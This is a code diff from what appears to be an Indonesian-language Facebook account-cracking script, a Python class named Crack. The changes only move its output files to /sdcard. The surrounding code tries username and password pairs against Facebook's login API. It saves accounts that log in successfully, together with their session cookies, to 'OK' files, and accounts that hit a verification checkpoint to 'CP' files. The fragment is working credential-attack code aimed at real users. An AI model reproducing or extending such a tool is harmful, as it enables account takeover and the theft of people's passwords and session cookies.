@@ -239,19 +239,19 @@ class Crack:
 					self.ok.append(user)
 					cookie = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
 					print(f"\r  {H}* -----> {user}|{pw}|{cookie}                ")
-					open(f"OK/{self.hari_ini}","a").write(f"  * --> {user}|{pw}|{cookie}\n")
+					open(f"/sdcard/OK/{self.hari_ini}","a").write(f"  * --> {user}|{pw}|{cookie}\n")
 				elif "User must verify their account on www.facebook.com" in post.json()["error"]["message"] or "User must verify their account" in post.text:
 					self.cp.append(user)
 					print(f"\r  {K}* -----> {user}|{pw}                  ")
-					open(f"CP/{self.hari_ini}","a").write(f"  * --> {user}|{pw}\n")
+					open(f"/sdcard/CP/{self.hari_ini}","a").write(f"  * --> {user}|{pw}\n")
 			except requests.exceptions.ConnectionError:time.sleep(30)
 			#except Exception as e:print(e)
 		self.loop+=1
 		
 					
 	def simpan_hasil(self):
-		print(f"\n [+] hasil OK disimpan ke : OK/{self.hari_ini}")
-		print(f" [+] hasil CP disimpan ke : CP/{self.hari_ini}")
+		print(f"\n [+] hasil OK disimpan ke : /sdcard/OK/{self.hari_ini}")
+		print(f" [+] hasil CP disimpan ke : /sdcard/CP/{self.hari_ini}")
 		print("\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n")
 		
 if __name__=="__main__":
